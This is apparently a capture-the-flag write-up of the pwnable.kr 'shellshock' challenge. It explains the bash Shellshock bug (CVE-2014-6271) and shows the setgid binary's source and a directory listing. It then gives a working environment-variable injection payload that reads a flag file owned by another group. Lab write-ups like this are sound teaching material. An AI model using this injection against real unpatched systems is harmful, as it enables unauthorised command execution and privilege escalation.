# shellshock

For those that know what shellshock (the vulnerability not the disorder) was then this had to be a relatively easy challenge. For the rest, this is pretty much unsolvable. So what was shellshock. Shellshock was a family of vulnerabilities in the bash with the most famous one being CVE-2014-6271 which was the initial one. Other ones followed since the bug was not patched properly at first.

Let's examine the vulnerability
```bash
envx='() { :;}; echo vulnerable' bash -c "echo test"
|------A------|-------B--------|-------C-----------|


A : That part sets an environment variable and the brackets after that, get the exploit ready to inject commands.
B : Arbitrary OS commands injection :)
C : BASH command “echo test” invoked with on-the-fly defined environment 
```
### Disclaimer
I changed the original flag with the custom flag "Shad3 pwnned this", it's better to exploit it yourself,
than just copy it :P.
## Exploitation
We've been given a binary which im guessing its vulnerable to shellshock but lets analyse the source code to be sure for that. 
```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}

shellshock@pwnable:~$ id
uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)
shellshock@pwnable:~$ ls -la
total 980
drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 116 root root             4096 Nov 12 21:34 ..
d---------   2 root root             4096 Oct 12  2014 .bash_history
dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
```
We are logged in as shellshock and we want to get the flag as shellshock_pwn we are allowed to do that only if we do some magic :). Let's exploit the bug and get our flag

```python
shellshock@pwnable:~$ export x="() { :;}; /bin/cat flag "
shellshock@pwnable:~$ ./shellshock 
Shad3 pwnned this
Segmentation fault (core dumped)
shellshock@pwnable:~$ 
```